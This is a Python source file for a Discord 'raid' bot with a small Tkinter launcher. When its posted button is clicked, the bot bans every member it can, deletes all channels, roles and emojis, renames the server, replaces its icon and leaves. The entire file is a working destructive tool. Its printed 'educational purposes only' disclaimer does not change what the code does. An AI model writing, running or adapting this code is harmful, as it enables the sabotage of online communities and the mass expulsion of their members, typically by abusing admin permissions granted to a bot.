import sys
import tkinter as tk
from tkinter import messagebox
import discord
from discord.ui import Button, View
import json
from colorama import Fore, Style

def confirm():
    root.destroy()
    start_bot()

def cancel():
    root.destroy()
    sys.exit(0)

def start_bot():
    print("Initializing Bot...")
    
    with open("config.json", "r") as f:
        data = json.load(f)
    
    token = data["TOKEN"]
    trigger = data["TRIGGER"]
    invite = data["INVITE_LINK"]
    ban_msg = data["BAN_MESSAGE"]
    new_name = data["NEW_NAME"]
    image_path = data["IMAGE_PATH"]

    print("\nDisclaimer:")
    print(Fore.YELLOW + "This is for educational purposes only.")
    print("Use this only if you have the consent of the server owner.")
    print("I am not responsible for any damage done by this bot.")
    print(Style.RESET_ALL)

    intents = discord.Intents.default()
    intents.members = True

    client = discord.Client(intents=intents)
    print(Fore.GREEN + f"[BOT] INVITE: {invite}")
    print(Fore.YELLOW + f"[BOT] BAN_MSG: {ban_msg}")
    print(Fore.YELLOW + f"[BOT] TRIGGER: {trigger}")
    print(Style.RESET_ALL)

    @client.event
    async def on_ready():
        activity = discord.Activity(type=discord.ActivityType.streaming, name=trigger)
        await client.change_presence(status=discord.Status.do_not_disturb, activity=activity)
        print(Fore.GREEN + "[BOT] READY")
        print(Fore.GREEN + f"[BOT] LOGGED IN: {client.user}")
        # Send a message with a button when the bot is ready
        channel = client.get_channel(1549155401122193548)  # Updated channel ID
        await channel.send("Press the button to trigger the bot actions!", view=MyView())

    class MyView(View):
        def __init__(self):
            super().__init__()
            self.add_item(MyButton())

    class MyButton(Button):
        def __init__(self):
            super().__init__(label="Trigger", style=discord.ButtonStyle.green)

        async def callback(self, interaction: discord.Interaction):
            await interaction.response.defer()  # Acknowledge the button click
            message = interaction.message
            print(Fore.YELLOW + f"[BOT] RAID INIT FROM: {message.author}")
            print(Fore.RED + "[WARNING] RAIDING SERVER")
            print(Fore.GREEN + f"[BOT] SERVER: {message.guild.name}")
            print(Style.RESET_ALL)

            # Banning all members possible
            for x in message.guild.members:
                print(Fore.BLUE + f"[MEMBER] BANNING {x}")
                try:
                    await x.ban(reason=ban_msg)
                    print(Fore.GREEN + "SUCCESS")
                except Exception as e:
                    print(Fore.RED + "FAILED")

            # Deleting all channels+categories possible
            for y in message.guild.channels:
                print(Fore.BLUE + f"[CHANNEL] DELETING {y}")
                try:
                    await y.delete()
                    print(Fore.GREEN + "SUCCESS")
                except Exception as e:
                    print(Fore.RED + "FAILED")

            # Load Server Icon specified in config
            with open(image_path, "rb") as pic:
                logo = pic.read()

            # Delete all possible roles
            for z in message.guild.roles:
                print(Fore.BLUE + f"[ROLE] DELETING {z}")
                try:
                    await z.delete()
                    print(Fore.GREEN + "SUCCESS")
                except Exception as e:
                    print(Fore.RED + "FAILED")

            # Delete Emojis
            for a in message.guild.emojis:
                print(Fore.BLUE + f"[EMOJI] DELETING {a}")
                try:
                    await a.delete()
                    print(Fore.GREEN + "SUCCESS")
                except Exception as e:
                    print("FAILED")

            print(Fore.GREEN + f"[BOT] NEW NAME: {new_name}")
            print(Fore.BLUE + f"[NAME] CHANGING SERVER NAME TO {new_name}")
            try:
                await message.guild.edit(name=new_name)  # Change Name icon=logo
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")
            print(Fore.BLUE + f"[ICON] CHANGING SERVER ICON TO {image_path}")
            try:
                await message.guild.edit(icon=logo)  # Change Name
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")

            print(Fore.GREEN + f"[BOT] PROCESS COMPLETE")
            print(Fore.YELLOW + f"[BOT] LEAVING SERVER {message.guild.name}")
            try:
                await message.guild.leave()
                print(Fore.GREEN + "SUCCESS")
            except Exception as e:
                print(Fore.RED + "FAILED")

            print(Style.RESET_ALL)

    client.run(token)

root = tk.Tk()
root.title("Bot Launcher")
root.geometry("350x150")
root.resizable(False, False)

label = tk.Label(
    root,
    text="Continue and start the bot?",
    font=("Arial", 14)
)
label.pack(pady=25)

button_frame = tk.Frame(root)
button_frame.pack()

yes_button = tk.Button(
    button_frame,
    text="YES",
    width=10,
    command=confirm
)
yes_button.pack(side="left", padx=10)

no_button = tk.Button(
    button_frame,
    text="NO",
    width=10,
    command=cancel
)
no_button.pack(side="left", padx=10)

root.mainloop()
